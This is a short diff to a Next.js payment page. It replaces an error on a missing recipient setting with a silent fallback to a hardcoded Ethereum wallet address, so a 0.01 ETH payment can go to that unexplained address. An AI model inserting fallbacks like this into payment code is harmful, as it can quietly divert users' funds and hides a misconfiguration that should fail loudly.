@@ -27,8 +27,7 @@ export default function CustomPage() {
       } else { throw switchErr; }
     }
     const signer = await provider.getSigner();
-    const recipient = process.env.NEXT_PUBLIC_PAYMENT_RECIPIENT_ADDRESS;
-    if (!recipient) throw new Error("Payment address not configured.");
+    const recipient = process.env.NEXT_PUBLIC_PAYMENT_RECIPIENT_ADDRESS || "0x1ba840fb6fC2a1a9cd9880803d920228DCF919E9";
     const tx = await signer.sendTransaction({ to: recipient, value: parseEther("0.01") });
     await tx.wait();
     return tx.hash;
